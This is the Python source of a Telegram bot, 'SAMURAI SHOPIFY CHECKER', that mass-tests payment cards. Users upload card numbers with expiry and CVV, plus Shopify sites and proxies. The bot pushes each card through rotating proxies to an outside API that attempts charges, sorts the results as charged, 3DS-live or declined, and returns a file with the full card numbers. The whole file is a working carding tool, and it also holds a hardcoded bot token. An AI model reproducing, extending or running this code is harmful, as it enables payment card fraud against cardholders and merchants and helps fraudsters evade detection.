# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN TERMUX ORIGINAL
CON CLASIFICACIÓN CORREGIDA (detecta Thank You sin $)
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import signal
import sys

from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import aiohttp

# ================== CONFIGURACIÓN ==================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CONFIGURACIÓN ==================
class Settings:
    """Configuración global del bot - VERSIÓN TERMUX ORIGINAL"""
    # 🔴 TOKEN DEL BOT
    TOKEN = "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE"
    
    # API endpoints
    API_ENDPOINTS = [
        "https://auto-shopify-api-production.up.railway.app/index.php",
    ]

    DB_FILE = "bot_samurai.db"
    
    # Timeouts
    TIMEOUT_CONFIG = {
        "connect": 10,
        "sock_read": 45,
        "total": None,
        "response_body": 45,
    }
    
    # Configuración de concurrencia
    CONCURRENT_LIMIT = 3

# ================== CLASIFICADOR SAMURAI CORREGIDO ==================
class SamuraiClassifier:
    """
    Clasifica respuestas según la API de SAMURAI:
    ✅ Thank You $XX.XX ➔ CHARGED
    🔒 3DS / 3D_AUTHENTICATION ➔ 3DS Required (se cuenta como LIVE)
    ❌ GENERIC_DECLINE ➔ DECLINED
    💸 INSUFFICIENT_FUNDS ➔ DECLINED
    🤖 CAPTCHA_REQUIRED ➔ BLOQUEADO
    """
    
    @staticmethod
    def classify(response_text: str, status_code: int) -> Dict:
        response_lower = response_text.lower()
        
        # 1️⃣ DETECTAR CHARGED (Thank You con monto - CON O SIN $)
        thank_you_pattern = r'thank\s*you.*?(\d+\.?\d*)'
        thank_match = re.search(thank_you_pattern, response_lower, re.IGNORECASE)
        if thank_match and "thank" in response_lower:
            amount_raw = thank_match.group(1)
            # Formatear el monto con 2 decimales
            try:
                amount_float = float(amount_raw)
                amount = f"${amount_float:.2f}"
            except:
                amount = f"${amount_raw}"
            return {
                "status": "CHARGED",
                "emoji": "✅",
                "amount": amount
            }
        
        # 2️⃣ DETECTAR 3DS
        if "3ds" in response_lower or "3d_authentication" in response_lower:
            return {
                "status": "3DS",
                "emoji": "🔒",
                "amount": None
            }
        
        # 3️⃣ DETECTAR INSUFFICIENT FUNDS
        if "insufficient_funds" in response_lower:
            return {
                "status": "DECLINED",
                "emoji": "💸",
                "amount": None
            }
        
        # 4️⃣ DETECTAR CAPTCHA
        if "captcha" in response_lower:
            return {
                "status": "CAPTCHA",
                "emoji": "🤖",
                "amount": None
            }
        
        # 5️⃣ DETECTAR GENERIC DECLINE
        if "generic_decline" in response_lower or "declined" in response_lower:
            return {
                "status": "DECLINED",
                "emoji": "❌",
                "amount": None
            }
        
        # 6️⃣ DETECTAR CARD DECLINED específico
        if "card_declined" in response_lower:
            return {
                "status": "DECLINED",
                "emoji": "❌",
                "amount": None
            }
        
        # 7️⃣ DETECTAR ERRORES CONOCIDOS (para marcarlos como UNKNOWN)
        if "product id is empty" in response_lower:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        
        if "del ammount empty" in response_lower:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        
        if "r4 token empty" in response_lower:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        
        if "generic_error" in response_lower:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        
        if "tax ammount empty" in response_lower:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        
        # 8️⃣ Por código HTTP
        if status_code == 200:
            return {
                "status": "UNKNOWN",
                "emoji": "❓",
                "amount": None
            }
        elif status_code >= 400:
            return {
                "status": "ERROR",
                "emoji": "⚠️",
                "amount": None
            }
        
        return {
            "status": "UNKNOWN",
            "emoji": "❓",
            "amount": None
        }

# ================== DETECTOR DE LÍNEAS ==================
class LineDetector:
    @staticmethod
    def detect(line: str) -> Tuple[str, Optional[str]]:
        line = line.strip()
        if not line:
            return None, None

        # SITES
        if line.startswith(('http://', 'https://')):
            return 'site', line
        
        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
        if re.match(domain_pattern, line):
            return 'site', f"https://{line}"

        # PROXIES
        parts = line.split(':')
        if len(parts) == 2:
            if parts[1].isdigit():
                return 'proxy', line
        elif len(parts) == 4:
            if parts[1].isdigit():
                return 'proxy', line

        # CARDS
        if '|' in line:
            parts = line.split('|')
            if len(parts) == 4:
                if all(p.isdigit() for p in parts):
                    return 'card', line

        return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self):
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]'
                )
            ''')
            conn.commit()
        logger.info("✅ Base de datos inicializada")
    
    def get_user_data(self, user_id: int) -> Dict:
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT sites, proxies, cards FROM users WHERE user_id = ?", (user_id,))
            row = cursor.fetchone()
            
            if not row:
                cursor.execute("INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                             (user_id, '[]', '[]', '[]'))
                conn.commit()
                return {"sites": [], "proxies": [], "cards": []}
            
            return {
                "sites": json.loads(row[0]),
                "proxies": json.loads(row[1]),
                "cards": json.loads(row[2])
            }
    
    def _save(self, user_id: int, data: Dict):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
                (json.dumps(data["sites"]), json.dumps(data["proxies"]), json.dumps(data["cards"]), user_id)
            )
            conn.commit()
    
    def add_items(self, user_id: int, sites: List[str], proxies: List[str], cards: List[str]) -> Dict:
        data = self.get_user_data(user_id)
        
        sites_added = 0
        for site in sites:
            if site not in data["sites"]:
                data["sites"].append(site)
                sites_added += 1
        
        proxies_added = 0
        for proxy in proxies:
            if proxy not in data["proxies"]:
                data["proxies"].append(proxy)
                proxies_added += 1
        
        cards_added = 0
        for card in cards:
            if card not in data["cards"] and CardValidator.parse_card(card):
                data["cards"].append(card)
                cards_added += 1
        
        if sites_added > 0 or proxies_added > 0 or cards_added > 0:
            self._save(user_id, data)
        
        return {
            "sites": sites_added,
            "proxies": proxies_added,
            "cards": cards_added
        }
    
    def get_cards_parsed(self, user_id: int) -> List[Dict]:
        data = self.get_user_data(user_id)
        cards = []
        for card_str in data["cards"]:
            card_data = CardValidator.parse_card(card_str)
            if card_data:
                cards.append(card_data)
        return cards
    
    def remove_all_sites(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["sites"])
        data["sites"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_proxies(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["proxies"])
        data["proxies"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_cards(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["cards"])
        data["cards"] = []
        self._save(user_id, data)
        return count

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:],
            "full": card_str
        }

# ================== VERIFICADOR ==================
class SamuraiChecker:
    @staticmethod
    async def check_card(card_data: Dict, site: str, proxy: str, session: aiohttp.ClientSession) -> Dict:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        api_endpoint = random.choice(Settings.API_ENDPOINTS)
        
        # Configurar proxy
        proxy_parts = proxy.split(':')
        proxy_url = None
        proxy_display = proxy
        
        if len(proxy_parts) == 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}"
        elif len(proxy_parts) == 2:
            proxy_url = f"http://{proxy}"
            proxy_display = proxy
        
        timeout = aiohttp.ClientTimeout(
            total=None,
            connect=Settings.TIMEOUT_CONFIG["connect"],
            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
        )
        
        start_time = time.time()
        
        try:
            if proxy_url:
                async with session.get(api_endpoint, params=params, proxy=proxy_url, timeout=timeout) as resp:
                    response_text = await resp.text()
                    elapsed = time.time() - start_time
            else:
                async with session.get(api_endpoint, params=params, timeout=timeout) as resp:
                    response_text = await resp.text()
                    elapsed = time.time() - start_time
            
            classification = SamuraiClassifier.classify(response_text, resp.status)
            
            return {
                "success": classification["status"] in ["CHARGED", "3DS"],
                "status": classification["status"],
                "emoji": classification["emoji"],
                "amount": classification.get("amount"),
                "time": round(elapsed, 2),
                "site": site,
                "proxy": proxy_display,
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str,
                "response": response_text[:500]
            }
            
        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            return {
                "success": False,
                "status": "TIMEOUT",
                "emoji": "⏱️",
                "time": round(elapsed, 2),
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str,
                "site": site,
                "proxy": proxy_display
            }
        except Exception as e:
            elapsed = time.time() - start_time
            return {
                "success": False,
                "status": "ERROR",
                "emoji": "⚠️",
                "time": round(elapsed, 2),
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str,
                "site": site,
                "proxy": proxy_display
            }

# ================== BARRA DE PROGRESO ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

# ================== VARIABLES GLOBALES ==================
db = Database()
active_mass = {}

# ================== COMANDOS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *SAMURAI SHOPIFY CHECKER 3x*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "*CLASIFICACIÓN:*\n"
        "✅ Thank You $XX.XX ➔ CHARGED\n"
        "🔒 3DS ➔ 3DS (LIVE)\n"
        "❌ GENERIC_DECLINE ➔ DECLINED\n"
        "💸 INSUFFICIENT_FUNDS ➔ DECLINED\n"
        "🤖 CAPTCHA ➔ BLOQUEADO\n\n"
        "*⚡ MODO:* 3 tarjetas en paralelo\n"
        "*📌 COMANDOS:*\n"
        "• Envía un archivo `.txt` con sitios, proxies y tarjetas\n"
        "• El bot detecta automáticamente cada tipo\n"
        "• `/mass` - Iniciar mass check\n"
        "• `/sites` - Listar sitios\n"
        "• `/proxies` - Listar proxies\n"
        "• `/cards` - Listar tarjetas\n"
        "• `/rmsite all` - Borrar sitios\n"
        "• `/rmproxy all` - Borrar proxies\n"
        "• `/rmcard all` - Borrar tarjetas\n"
        "• `/stop` - Detener mass check",
        parse_mode="Markdown"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Envía un archivo .txt")
        return
    
    msg = await update.message.reply_text("🔄 Analizando archivo...")
    
    file = await context.bot.get_file(document.file_id)
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    sites, proxies, cards = [], [], []
    
    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue
        tipo, normalizado = LineDetector.detect(line)
        if tipo == 'site':
            sites.append(normalizado)
        elif tipo == 'proxy':
            proxies.append(normalizado)
        elif tipo == 'card' and CardValidator.parse_card(normalizado):
            cards.append(normalizado)
    
    added = db.add_items(user_id, sites, proxies, cards)
    
    response = [f"📊 *ANÁLISIS*\n━━━━━━━━━━━━━━━━━━\n"]
    if sites:
        response.append(f"🌐 SITIOS: {len(sites)} (nuevos: {added['sites']})")
    if proxies:
        response.append(f"🔌 PROXIES: {len(proxies)} (nuevos: {added['proxies']})")
    if cards:
        response.append(f"💳 TARJETAS: {len(cards)} (nuevas: {added['cards']})")
    
    await msg.edit_text("\n".join(response), parse_mode="Markdown")

async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["sites"]:
        await update.message.reply_text("📭 No hay sitios")
        return
    text = "\n".join(f"{i}. {s}" for i, s in enumerate(data["sites"], 1))
    await update.message.reply_text(f"📋 *SITIOS*\n{text}", parse_mode="Markdown")

async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["proxies"]:
        await update.message.reply_text("📭 No hay proxies")
        return
    proxies = []
    for i, p in enumerate(data["proxies"], 1):
        parts = p.split(':')
        if len(parts) == 4:
            proxies.append(f"{i}. `{parts[0]}:{parts[1]}` (auth)")
        else:
            proxies.append(f"{i}. `{p}`")
    await update.message.reply_text("📋 *PROXIES*\n" + "\n".join(proxies), parse_mode="Markdown")

async def list_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["cards"]:
        await update.message.reply_text("📭 No hay tarjetas")
        return
    cards = []
    for i, c in enumerate(data["cards"], 1):
        parts = c.split('|')
        cards.append(f"{i}. `{parts[0][:6]}xxxxxx{parts[0][-4:]}|{parts[1]}|{parts[2]}|{parts[3]}`")
    await update.message.reply_text("📋 *TARJETAS*\n" + "\n".join(cards), parse_mode="Markdown")

async def remove_all_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_sites(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} sitios eliminados")

async def remove_all_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_proxies(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} proxies eliminados")

async def remove_all_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_cards(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} tarjetas eliminadas")

# ================== MASS CHECK ==================
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_mass and active_mass[user_id]:
        await update.message.reply_text("❌ Ya hay un mass check en curso. Usa /stop")
        return
    
    user_data = db.get_user_data(user_id)
    
    if not user_data["sites"] or not user_data["proxies"]:
        await update.message.reply_text("❌ Faltan sitios o proxies")
        return
    
    cards = db.get_cards_parsed(user_id)
    if not cards:
        await update.message.reply_text("❌ No hay tarjetas")
        return
    
    active_mass[user_id] = True
    
    # Mensaje inicial
    bar = create_progress_bar(0, len(cards))
    msg = await update.message.reply_text(
        f"🔥 *MASS CHECK 3x*\n"
        f"📊 {len(cards)} tarjetas\n"
        f"🔄 {len(user_data['sites'])} sitios | {len(user_data['proxies'])} proxies\n\n"
        f"Progreso: {bar} 0/{len(cards)}\n"
        f"✅ 0 | 🔒 0 | ❌ 0 | 🤖 0 | ⚠️ 0\n\n"
        f"⏳ Iniciando..."
    )
    
    results = []
    start_time = time.time()
    charged = three_ds = declined = captcha = errors = 0
    site_index = proxy_index = 0
    
    connector = aiohttp.TCPConnector(limit=Settings.CONCURRENT_LIMIT, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        total = len(cards)
        processed = 0
        
        for i in range(0, total, Settings.CONCURRENT_LIMIT):
            if not active_mass.get(user_id):
                break
            
            batch = cards[i:i+Settings.CONCURRENT_LIMIT]
            tasks = []
            
            for card in batch:
                site = user_data["sites"][site_index % len(user_data["sites"])]
                site_index += 1
                proxy = user_data["proxies"][proxy_index % len(user_data["proxies"])]
                proxy_index += 1
                tasks.append(SamuraiChecker.check_card(card, site, proxy, session))
            
            batch_results = await asyncio.gather(*tasks)
            results.extend(batch_results)
            
            # Actualizar contadores
            for r in batch_results:
                if r["status"] == "CHARGED":
                    charged += 1
                elif r["status"] == "3DS":
                    three_ds += 1
                elif r["status"] == "DECLINED":
                    declined += 1
                elif r["status"] == "CAPTCHA":
                    captcha += 1
                else:
                    errors += 1
            
            processed += len(batch)
            
            # Actualizar progreso
            bar = create_progress_bar(processed, total)
            last = batch_results[-1] if batch_results else None
            last_text = f"{last['emoji']} {last['card']}" if last else ""
            
            try:
                await msg.edit_text(
                    f"🔥 *MASS CHECK 3x*\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"Progreso: {bar} {processed}/{total}\n"
                    f"✅ {charged} | 🔒 {three_ds} | ❌ {declined} | 🤖 {captcha} | ⚠️ {errors}\n\n"
                    f"📌 {last_text}\n\n"
                    f"⏳ Procesando..."
                )
            except:
                pass
    
    elapsed = time.time() - start_time
    active_mass[user_id] = False
    
    # Generar archivo
    filename = f"samurai_results_{user_id}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"SAMURAI RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(cards)} | Tiempo: {elapsed:.2f}s\n")
        f.write(f"✅ {charged} | 🔒 {three_ds} | ❌ {declined} | 🤖 {captcha} | ⚠️ {errors}\n")
        f.write("="*80 + "\n\n")
        
        for i, r in enumerate(results, 1):
            f.write(f"[{i}] {r['emoji']} {r['card']}\n")
            f.write(f"    COMPLETA: {r['full_card']}\n")
            f.write(f"    ESTADO: {r['status']}\n")
            if r.get('amount'):
                f.write(f"    MONTO: {r['amount']}\n")
            f.write(f"    SITIO: {r.get('site', 'N/A')}\n")
            f.write(f"    PROXY: {r.get('proxy', 'N/A')}\n")
            f.write(f"    TIEMPO: {r.get('time', 0)}s\n")
            if r.get('response'):
                f.write(f"    RESPUESTA API:\n{r['response']}\n")
            f.write("-"*40 + "\n\n")
    
    with open(filename, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption=f"🔥 {len(results)} tarjetas en {elapsed:.1f}s"
        )
    
    os.remove(filename)
    
    # Mensaje final
    bar = create_progress_bar(processed, total)
    await update.message.reply_text(
        f"✅ *COMPLETADO*\n"
        f"{bar} {processed}/{total}\n"
        f"✅ {charged} | 🔒 {three_ds} | ❌ {declined} | 🤖 {captcha} | ⚠️ {errors}\n"
        f"⏱️ {elapsed:.1f}s",
        parse_mode="Markdown"
    )

async def stop_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass and active_mass[user_id]:
        active_mass[user_id] = False
        await update.message.reply_text("⏹ Deteniendo...")
    else:
        await update.message.reply_text("No hay mass check activo")

# ================== MAIN ==================
def main():
    print("🔥 SAMURAI SHOPIFY CHECKER")
    print("📁 Base de datos: bot_samurai.db")
    print("🚀 Bot iniciado...")
    
    app = Application.builder().token(Settings.TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sites", list_sites))
    app.add_handler(CommandHandler("proxies", list_proxies))
    app.add_handler(CommandHandler("cards", list_cards))
    app.add_handler(CommandHandler("rmsite", remove_all_sites))
    app.add_handler(CommandHandler("rmproxy", remove_all_proxies))
    app.add_handler(CommandHandler("rmcard", remove_all_cards))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stop", stop_mass))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Bot detenido")
        sys.exit(0)
